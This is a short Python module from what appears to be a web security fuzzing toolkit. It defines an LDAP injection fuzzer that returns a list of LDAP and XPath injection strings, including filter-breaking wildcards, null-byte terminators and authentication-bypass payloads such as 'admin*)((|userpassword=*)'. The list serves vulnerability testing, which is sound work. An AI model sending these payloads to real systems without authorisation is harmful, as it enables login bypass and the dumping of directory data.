#!/usr/bin/env python
# -*- coding: utf-8 -*-
# http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf

from saker.fuzzers.fuzzer import Fuzzer


class LdapInjection(Fuzzer):

    """LdapInjection"""

    def __init__(self):
        super(LdapInjection, self).__init__()

    @staticmethod
    def test(self):
        return [
            "!",
            "%21",
            "%26",
            "%28",
            "%29",
            "%2A%28%7C%28mail%3D%2A%29%29",
            "%2A%28%7C%28objectclass%3D%2A%29%29",
            "%2A%7C",
            "%7C",
            "&",
            "(",
            ")",
            "*)%00",
            "*))%00",
            "*)))%00",
            "*(|(mail=*))",
            "*(|(objectclass=*))",
            "*/*",
            "*|",
            "/",
            "//",
            "//*",
            "@*",
            "x' or name()='username' or 'x'='y",
            "|",
            "*()|&'",
            "admin*",
            "admin*)((|userpassword=*)",
            "*)(uid=*))(|(uid=*",
        ]
